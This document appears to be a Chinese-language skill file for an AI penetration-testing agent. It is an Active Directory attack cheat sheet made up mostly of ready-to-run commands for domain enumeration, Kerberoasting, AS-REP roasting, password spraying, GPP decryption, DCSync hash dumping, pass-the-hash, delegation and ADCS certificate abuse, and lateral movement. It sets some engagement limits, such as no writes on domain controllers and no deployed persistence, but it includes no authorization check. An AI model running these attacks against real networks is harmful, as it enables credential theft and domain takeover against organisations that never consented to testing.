---
name: active-directory-attack
description: 目标存在 Windows 域环境、拿到域账号或内网 SMB/WinRM 可达时调用——域枚举、Kerberoast/AS-REP、委派、ADCS、DCSync、BloodHound 路径与 Exchange 攻击面。
tags:
  cwe: [CWE-522, CWE-269, CWE-287]
  attack: [T1558.003, T1558.004, T1003.006, T1484, T1550.002]
  class: [active-directory, kerberos, domain, windows]
---

# 域渗透速查

## 前置

- 一个域账号（哪怕低权）或一台已控主机；确认 DC 地址与 DNS（`nltest /dsgetdc:domain`）。
- 所有 hash/票据**全文落 fact**（含来源主机、服务、到期时间）。

## 枚举（低噪声优先）

- 无凭据：`nxc smb <dc>`（版本/域信息）、`nxc ldap <dc> -u '' -p ''`（匿名）；
- 有凭据：`nxc smb <dc> -u user -p pass --users --groups --shares`；
- 域信息：`net user /domain`、`net group "Domain Admins" /domain`、`Get-ADUser -Filter *`；
- BloodHound：SharpHound 采集（`-c All`）→ 分析最短路径到 Domain Admins；
- 共享枚举：`nxc smb <host> -u user -p pass --shares`，重点 SYSVOL/NETLOGON 的 GPP。

## 凭据攻击

| 手法 | 命令 | 说明 |
|---|---|---|
| Kerberoast | `impacket-GetUserSPNs dom/user:pass -dc-ip dc -request` | 拿到 SPN 账号 TGS → `hashcat -m 13100` |
| AS-REP | `impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat` | 无需预认证账号 → `hashcat -m 18200` |
| 密码喷洒 | `nxc smb <dc> -u users.txt -p 'Spring2026!' --continue-on-success` | 先查锁定策略，控制在 2-3 次 |
| GPP | `gpp-decrypt <cpassword>` | SYSVOL 里的 Groups.xml |
| DCSync | `impacket-secretsdump dom/admin:pass@dc` | 需复制目录权限 |
| PtH | `impacket-wmiexec -hashes :<ntlm> user@host` | 无明文时横向 |

## 委派

- 非约束委派：`impacket-findDelegation dom/user:pass -dc-ip dc`；
- 约束委派 → 利用 S4U（`impacket-getST -spn cifs/host -impersonate administrator`）；
- RBCD：写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 后走 S4U。

## ADCS（证书服务）

- `certipy find -u user@dom -p pass -dc-ip dc -vulnerable`；
- ESC1：模板允许请求者指定 SAN + 客户端认证 → 申请管理员证书；
- ESC8：HTTP relay → `certipy relay`；
- 拿到证书：`certipy auth -pfx admin.pfx` 换 TGT。

## Exchange / 邮件

- `/autodiscover/autodiscover.xml`、`/owa/`、`/ecp/`、`/mapi/` 指纹；
- ProxyLogon/ProxyShell 类漏洞只做**版本+行为**双重验证，不直接打利用链；
- 邮箱枚举走 OWA/EWS 的认证差异（注意锁定）。

## 横向与持久化（演示级）

- WinRM：`nxc winrm <host> -u user -p pass -x whoami`；
- SMB exec：`impacket-psexec/smbexec`；
- 持久化只落 fact 说明可行（计划任务/服务注册），**不实际部署**。

## 证据与边界

- 每条路径记录：起点主机/账号 → 手法 → 终点权限，形成可复核的链；
- 域控上**不做任何写操作**；DCSync 只导出必要账号 hash（最小集）；
- 触发锁定前停手（账号被锁会打草惊蛇），写入 fact 供决策。
